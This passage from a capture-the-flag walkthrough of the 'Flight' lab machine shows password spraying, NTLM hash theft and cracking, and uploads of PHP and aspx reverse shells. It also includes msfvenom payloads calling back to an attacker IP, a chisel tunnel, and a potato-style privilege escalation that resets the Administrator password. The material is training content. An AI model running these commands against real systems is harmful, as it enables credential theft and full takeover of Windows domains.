SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [-] flight.htb\G0$:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```

### C.Bum credentials

S.Moon has the same password as svc_apache. I'll use my already gathered information on bloodhound to see what S.Moon can do.

<p align="center">
  <a href="/assets/images/flight/captura11.png" class="glightbox">
    <img src="/assets/images/flight/captura11.png" width="700">
  </a>
</p>

Again, no interesting outbund control rights or groups. I'll check on the smb shares and see if our permissions changed.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ nxc smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares                
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ
```

It looks like we can write into a share now. I'll use [ntlm theft](https://github.com/Greenwolf/ntlm_theft) here. I don't have a specefic extension to put here, so I'll just use the flag `-g all` to use every single extension ntlm theft supports and put it in the share. Next, I'll set responder again to capture any possible ntlm.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight/ntlm_theft]
└─$ python ntlm_theft.py -g all -s 10.10.16.3 -f flight

Created: flight/flight.scf (BROWSE TO FOLDER)
Created: flight/flight-(url).url (BROWSE TO FOLDER)
Created: flight/flight-(icon).url (BROWSE TO FOLDER)
Created: flight/flight.lnk (BROWSE TO FOLDER)
Created: flight/flight.rtf (OPEN)
Created: flight/flight-(stylesheet).xml (OPEN)
Created: flight/flight-(fulldocx).xml (OPEN)
Created: flight/flight.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: flight/flight-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: flight/flight-(includepicture).docx (OPEN)
Created: flight/flight-(remotetemplate).docx (OPEN)
Created: flight/flight-(frameset).docx (OPEN)
Created: flight/flight-(externalcell).xlsx (OPEN)
Created: flight/flight.wax (OPEN)
Created: flight/flight.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: flight/flight.asx (OPEN)
Created: flight/flight.jnlp (OPEN)
Created: flight/flight.application (DOWNLOAD AND OPEN)
Created: flight/flight.pdf (OPEN AND ALLOW)
Created: flight/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: flight/flight.library-ms (BROWSE TO FOLDER)
Created: flight/Autorun.inf (BROWSE TO FOLDER)
Created: flight/desktop.ini (BROWSE TO FOLDER)
Created: flight/flight.theme (THEME TO INSTALL
Generation Complete.
```

```bash
┌──(kali㉿kali)-[~/hackthebox/flight/ntlm_theft/flight]
└─$ smbclient -U 'S.Moon'  //flight.htb/Shared
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> mput *
putting file flight.application as \flight.application (0.8 kb/s) (average 0.8 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \flight-(icon).url
putting file flight.library-ms as \flight.library-ms (11.9 kb/s) (average 1.3 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \flight.m3u
NT_STATUS_ACCESS_DENIED opening remote file \flight.scf
NT_STATUS_ACCESS_DENIED opening remote file \flight.rtf
putting file flight-(stylesheet).xml as \flight-(stylesheet).xml (1.6 kb/s) (average 1.3 kb/s)
putting file flight.theme as \flight.theme (6.4 kb/s) (average 1.8 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \flight.pdf
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
NT_STATUS_ACCESS_DENIED opening remote file \flight-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \flight.asx
NT_STATUS_ACCESS_DENIED opening remote file \flight.wax
NT_STATUS_ACCESS_DENIED opening remote file \flight-(externalcell).xlsx
NT_STATUS_ACCESS_DENIED opening remote file \flight-(url).url
putting file flight.jnlp as \flight.jnlp (1.9 kb/s) (average 1.8 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \flight-(handler).htm
NT_STATUS_ACCESS_DENIED opening remote file \flight.htm
NT_STATUS_ACCESS_DENIED opening remote file \flight-(remotetemplate).docx
NT_STATUS_ACCESS_DENIED opening remote file \flight-(frameset).docx
putting file flight-(fulldocx).xml as \flight-(fulldocx).xml (237.9 kb/s) (average 25.7 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
putting file desktop.ini as \desktop.ini (0.5 kb/s) (average 24.9 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \flight.lnk
smb: \> 
```

Looks like some of the files won't upload because of restriction, however, the attack worked and we have achieved a new ntlm.

```bash
[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:ed3952fd77168bad:C58FE52A891F663BBA9EA253BD6A361E:0101000000000000805C67B031BADC010....                                                                                                                                                                                               
[*] Skipping previously captured hash for flight.htb\c.bum
[*] Skipping previously captured hash for flight.htb\c.bum

```

It also cracks easily with hashcat.

```powershell
C.BUM::flight.htb:ed3952fd77168bad:c58fe52a891f663bba9ea253bd6a361e:0101000000000000805c67b031badc0100029194c85aef830000000002000800500038003700510001001e00570049004e002d004900470034005100510036005900410053003900590004003400570049004e002d00490047003400510051003600590041005300390059002e0050003800370051002e004c004f00430041004c000300140050003800370051002e004c004f00430041004c000500140050003800370051002e004c004f00430041004c0007000800805c67b031badc010600040002000000080030003000000000000000000000000030000058e0af662bf94e26ed120b973d8ecc4d802b4ec34bc25a9fd2f49f35a358537b0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:Tikkycoll_431012284
```

Looking in bloodhound, C.Bum doesn't have any interesting outbound control rights but he is inside an intersting group.

<p align="center">
  <a href="/assets/images/flight/captura12.png" class="glightbox">
    <img src="/assets/images/flight/captura12.png" width="700">
  </a>
</p>

### Shell as svc_apache

Reviweing back in the SMB shares, there was one named "Web", maybe users in group `Webdevs` can write to it now.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight/ntlm_theft/flight]
└─$ nxc smb flight.htb -u C.Bum -p 'Tikkycoll_431012284' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE
```

I'll check the share now that I have permissions for it.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight/ntlm_theft/flight]
└─$ smbclient -U 'C.Bum'  //flight.htb/Web
Password for [WORKGROUP\C.Bum]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 22 20:12:01 2026
  ..                                  D        0  Sun Mar 22 20:12:01 2026
  flight.htb                          D        0  Sun Mar 22 20:12:01 2026
  school.flight.htb                   D        0  Sun Mar 22 20:12:01 2026

                5056511 blocks of size 4096. 1247290 blocks available
```

It looks like these are the directories containing the web root of the web pages and virtual hosts discovered earlier. I'll put a .php file inside it and test if I can get a shell.

```
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ smbclient -U 'C.Bum'  //flight.htb/Web
Password for [WORKGROUP\C.Bum]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 22 20:27:01 2026
  ..                                  D        0  Sun Mar 22 20:27:01 2026
  flight.htb                          D        0  Sun Mar 22 20:27:01 2026
  school.flight.htb                   D        0  Sun Mar 22 20:27:01 2026

                5056511 blocks of size 4096. 1246594 blocks available
smb: \school.flight.htb\> ls
  .                                   D        0  Sun Mar 22 20:27:01 2026
  ..                                  D        0  Sun Mar 22 20:27:01 2026
  about.html                          A     1689  Mon Oct 24 23:54:45 2022
  blog.html                           A     3618  Mon Oct 24 23:53:59 2022
  home.html                           A     2683  Mon Oct 24 23:56:58 2022
  images                              D        0  Sun Mar 22 20:27:01 2026
  index.php                           A     2092  Thu Oct 27 03:59:25 2022
  lfi.html                            A      179  Thu Oct 27 03:55:16 2022
  rev.php                             A     9292  Sun Mar 22 19:18:03 2026
  styles                              D        0  Sun Mar 22 20:27:01 2026

                5056511 blocks of size 4096. 1246594 blocks available
smb: \school.flight.htb\> put reverse.php
putting file reverse.php as \school.flight.htb\reverse.php (54.0 kb/s) (average 54.0 kb/s)
```

Now, I'll access it through the web page with a netcat listener on.

<p align="center">
  <a href="/assets/images/flight/captura13.png" class="glightbox">
    <img src="/assets/images/flight/captura13.png" width="700">
  </a>
</p>


```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ nc -lvnp 9001                                                
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.228.120] 59290
SOCKET: Shell has connected! PID: 3296
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\school.flight.htb>whoami
flight\svc_apache

C:\xampp\htdocs\school.flight.htb>
```

I'll invoke powershell and continue enumeration.

Looking at the Users directory, It looks like C.Bum has one home directory configured.

```bash
PS C:\Users> s


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/22/2022  12:28 PM                .NET v4.5                                                             
d-----        9/22/2022  12:28 PM                .NET v4.5 Classic                                                     
d-----       10/31/2022  11:34 AM                Administrator                                                         
d-----        9/22/2022   1:08 PM                C.Bum                                                                 
d-r---        7/20/2021  12:23 PM                Public                                                                
d-----       10/21/2022  11:50 AM                svc_apache                                                            

```

### Shell as C.Bum

C.Bum can't remote into the machine as he doesn't have the permissions however, we have plaintext credentials for his account. To achieve a shell in these circumstances, we can use [Runas](https://github.com/antonioCoco/RunasCs).

We'll simply make C.Bum execute a previously planted reverse shell crafted with msfvenom to get a shell as him.

First, we'll craft our reverse shell.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ msfvenom -p windows/x64/shell_reverse_tcp  lhost=10.10.16.3 lport=9001 -f exe -o access.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: access.exe
```

Next, I'll transfer it to the machine and place it in a world-readble directory, so we don't have issues with permissions later.

```powershell
PS C:\Users\Public> iwr -uri http://10.10.16.3/access.exe -o access.exe
PS C:\Users\Public> ls


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        7/20/2021  12:20 PM                Documents                                                             
d-r---        9/15/2018  12:19 AM                Downloads                                                             
d-r---        9/15/2018  12:19 AM                Music                                                                 
d-r---        9/15/2018  12:19 AM                Pictures                                                              
d-r---        9/15/2018  12:19 AM                Videos                                                                
-a----        3/22/2026   5:42 PM           7168 access.exe
```

I already have a compiled binary of RunasCs in my kali. I'll transfer it to the directory of svc_apache.

```powershell
PS C:\Users\svc_apache> iwr -uri http://10.10.16.3/RunasCs.exe -o RunasCs.exe
PS C:\Users\svc_apache> ls


    Directory: C:\Users\svc_apache


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        9/15/2018  12:19 AM                Desktop                                                               
d-r---        9/22/2022   1:16 PM                Documents                                                             
d-r---        9/15/2018  12:19 AM                Downloads                                                             
d-r---        9/15/2018  12:19 AM                Favorites                                                             
d-r---        9/15/2018  12:19 AM                Links                                                                 
d-r---        9/15/2018  12:19 AM                Music                                                                 
d-r---        9/15/2018  12:19 AM                Pictures                                                              
d-----        9/15/2018  12:19 AM                Saved Games                                                           
d-r---        9/15/2018  12:19 AM                Videos                                                                
-a----        3/22/2026   5:46 PM          51712 RunasCs.exe                                                           


PS C:\Users\svc_apache> 
```

With this, everything is ready, I'll open a netcat listener and execute the reverse shell with Runas as C.Bum.

```powershell
PS C:\Users\svc_apache> .\RunasCs.exe c.bum Tikkycoll_431012284 C:\Users\Public\access.exe
[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
```

I receive a connection on my netcat as C.Bum.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight/smb]
└─$ nc -lvnp 9001
listening on [any] 9001 ...

connect to [10.10.16.3] from (UNKNOWN) [10.129.228.120] 56711
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
flight\c.bum

C:\Windows\system32>
```

And the user.txt is in C.Bum's desktop.

```powershell
PS C:\Users\C.bum\Desktop> ls


    Directory: C:\Users\C.bum\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        3/22/2026   1:40 PM             34 user.txt                                                              


```

Since C.Bum is part of the WebDevs group, I wanted to see if there was anything else we could leverage from that access. We already know the application is running on XAMPP, but while browsing the filesystem I noticed an C:\inetpub directory.

This caught my attention, as inetpub is typically used by IIS, which isn’t exposed externally. This could indicate a secondary web service, something under development, or leftover configuration.

```powershell
PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        3/22/2026   5:47 PM                inetpub                                                               
d-----         6/7/2022   6:39 AM                PerfLogs                                                              
d-r---       10/21/2022  11:49 AM                Program Files                                                         
d-----        7/20/2021  12:23 PM                Program Files (x86)                                                   
d-----        3/22/2026   5:11 PM                Shared                                                                
d-----        9/22/2022  12:28 PM                StorageReports                                                        
d-r---        9/22/2022   1:16 PM                Users                                                                 
d-----       10/21/2022  11:52 AM                Windows                                                               
d-----        9/22/2022   1:16 PM                xampp
```

Inside, there's a non default directory named `development`.

```powershell
PS C:\inetpub> ls
ls


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/22/2022  12:24 PM                custerr                                                               
d-----        3/22/2026   5:52 PM                development                                                           
d-----        9/22/2022   1:08 PM                history                                                               
d-----        9/22/2022  12:32 PM                logs                                                                  
d-----        9/22/2022  12:24 PM                temp                                                                  
d-----        9/22/2022  12:28 PM                wwwroot
```

Inside, we have an index.html. Reviweing it manually reveals that this is indeed a new web page. Now we have to figure out how.

```bash
PS C:\inetpub\development> ls
ls


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        3/22/2026   5:57 PM                css                                                                   
d-----        3/22/2026   5:57 PM                fonts                                                                 
d-----        3/22/2026   5:57 PM                img                                                                   
d-----        3/22/2026   5:57 PM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html                                                            


PS C:\inetpub\development> cat index.html
cat index.html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<!--

Template 2093 Flight

http://www.tooplate.com/view/2093-flight

-->
        <title>Flight - Travel and Tour</title>
    
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">

        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/bootstrap-theme.min.css">
        <link rel="stylesheet" href="css/fontAwesome.css">
        <link rel="stylesheet" href="css/hero-slider.css">
        <link rel="stylesheet" href="css/owl-carousel.css">
        <link rel="stylesheet" href="css/datepicker.css">
        <link rel="stylesheet" href="css/tooplate-style.css">

        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">

        <script src="js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
    </head>

......

```

For this, I chose to search for open ports in state of `LISTENING`.

```bash
PS C:\inetpub\development> netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5612
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5612
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1508
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       500
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1148
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1620
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       2572
  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       3016
  TCP    0.0.0.0:49704          0.0.0.0:0              LISTENING       644
  TCP    10.129.228.120:53      0.0.0.0:0              LISTENING       2572
  TCP    10.129.228.120:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2572
  TCP    [::]:80                [::]:0                 LISTENING       5612
  TCP    [::]:88                [::]:0                 LISTENING       664
  TCP    [::]:135               [::]:0                 LISTENING       920
  TCP    [::]:389               [::]:0                 LISTENING       664
  TCP    [::]:443               [::]:0                 LISTENING       5612
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       664
  TCP    [::]:593               [::]:0                 LISTENING       920
  TCP    [::]:636               [::]:0                 LISTENING       664
  TCP    [::]:3268              [::]:0                 LISTENING       664
  TCP    [::]:3269              [::]:0                 LISTENING       664
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8000              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       1508
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       500
  TCP    [::]:49665             [::]:0                 LISTENING       1148
  TCP    [::]:49666             [::]:0                 LISTENING       1620
  TCP    [::]:49667             [::]:0                 LISTENING       664
  TCP    [::]:49673             [::]:0                 LISTENING       664
  TCP    [::]:49674             [::]:0                 LISTENING       664
  TCP    [::]:49686             [::]:0                 LISTENING       2572
  TCP    [::]:49695             [::]:0                 LISTENING       3016
  TCP    [::]:49704             [::]:0                 LISTENING       644
  TCP    [::1]:53               [::]:0                 LISTENING       2572
  TCP    [dead:beef::139]:53    [::]:0                 LISTENING       2572
```

Port 8000 immediately caught my attention. We can test this simply with curl.

```powershell
PS C:\Users\C.Bum> curl 127.0.0.1:8000 -o test.html

PS C:\Users\C.Bum> ls



    Directory: C:\Users\C.Bum


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        9/22/2022   1:17 PM                Desktop                                                               
d-r---        9/22/2022   1:08 PM                Documents                                                             
d-r---        9/15/2018  12:19 AM                Downloads                                                             
d-r---        9/15/2018  12:19 AM                Favorites                                                             
d-r---        9/15/2018  12:19 AM                Links                                                                 
d-r---        9/15/2018  12:19 AM                Music                                                                 
d-r---        9/15/2018  12:19 AM                Pictures                                                              
d-----        9/15/2018  12:19 AM                Saved Games                                                           
d-r---        9/15/2018  12:19 AM                Videos                                                                
-a----        3/22/2026   6:04 PM          45949 test.html                                                             


PS C:\Users\C.Bum> cat test.html
cat test.html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<!--

Template 2093 Flight

http://www.tooplate.com/view/2093-flight

-->
        <title>Flight - Travel and Tour</title>
    
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">

        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/bootstrap-theme.min.css">
        <link rel="stylesheet" href="css/fontAwesome.css">
        <link rel="stylesheet" href="css/hero-slider.css">
```

It is the same index.html inside inetpub. To access this, we can simply use chisel. I'll open a tunnel in my kali with port 9999.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight/smb]
└─$ ./chisel_1.10.1_linux_amd64 server -p 9999 --reverse
2026/03/22 20:26:29 server: Reverse tunnelling enabled
2026/03/22 20:26:29 server: Fingerprint zBdQPGYUY84Po5pnMWjAraWRSjIZwonWGhddqRI+l0w=
2026/03/22 20:26:29 server: Listening on http://0.0.0.0:9999

```

And in powershell as c.bum, I'll connect to it, forwarding port 8000.

```powershell
PS C:\Users\C.Bum> ./chisel.exe client 10.10.16.3:9999 R:8000:127.0.0.1:8000
./chisel.exe client 10.10.16.3:9999 R:8000:127.0.0.1:8000
2026/03/22 18:11:18 client: Connecting to ws://10.10.16.3:9999
2026/03/22 18:11:18 client: Connected (Latency 31.8236ms)

```

Once connected, we can access that website now.

<p align="center">
  <a href="/assets/images/flight/captura14.png" class="glightbox">
    <img src="/assets/images/flight/captura14.png" width="700">
  </a>
</p>

It looks again underdeveloped, with no functionality. Checking the permission on the directory in inetpub, I discovered that C.Bum can write to it.

```powershell
PS C:\inetpub\development> icacls .
. flight\C.Bum:(OI)(CI)(W)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

The next step is to attempt a reverse shell. Since execution is handled by IIS, the shell will run under the `IIS APPPOOL\DefaultAppPool` context rather than the C.Bum user. Inetpub renders .aspx files, so our reverse shell can be crafted with msfvenom.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ msfvenom -p windows/x64/shell_reverse_tcp  lhost=10.10.16.3 lport=9003 -f aspx -o access.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3410 bytes
Saved as: access.aspx
```

```powershell
PS C:\inetpub\development> iwr -uri http://10.10.16.3/access.aspx -o access.aspx                                    
iwr -uri http://10.10.16.3/access.aspx -o access.aspx                                                               
PS C:\inetpub\development> ls                                                                                       
ls                                                                                                                  
                                                                                                                    
                                                                                                                    
    Directory: C:\inetpub\development                                                                               
                                                                                                                    
                                                                                                                    
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        3/22/2026   6:22 PM                css                                                                   
d-----        3/22/2026   6:22 PM                fonts                                                                 
d-----        3/22/2026   6:22 PM                img                                                                   
d-----        3/22/2026   6:22 PM                js                                                                    
-a----        3/22/2026   6:26 PM           3410 access.aspx                                                           
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html
```

I'll access it through the chisel tunnel.

<p align="center">
  <a href="/assets/images/flight/captura15.png" class="glightbox">
    <img src="/assets/images/flight/captura15.png" width="700">
  </a>
</p>

And I get a connection in my listener.

```powershell
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ nc -lvnp 9003
listening on [any] 9003 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.228.120] 60110
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

````

## Privilege Escalation

### Shell as SYSTEM

I didn't need much enumeration to know the next step. `whoami /all` will reveal that this new user has some interesting privileges.

```powershell
PS C:\windows\system32\inetsrv> whoami /all
whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Seeing that SeImpersonate is enabled, I'll use SigmaPotato to chenge the Administrator's password.

```powershell
PS C:\Users\Public> ./SigmaPotato.exe "net user Administrator newpass00**"
./SigmaPotato.exe "net user Administrator newpass00**"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 920 | Token: 0x808 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 996
[+] Current Command Length: 34 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 3528

[+] Process Output:
The command completed successfully.

```

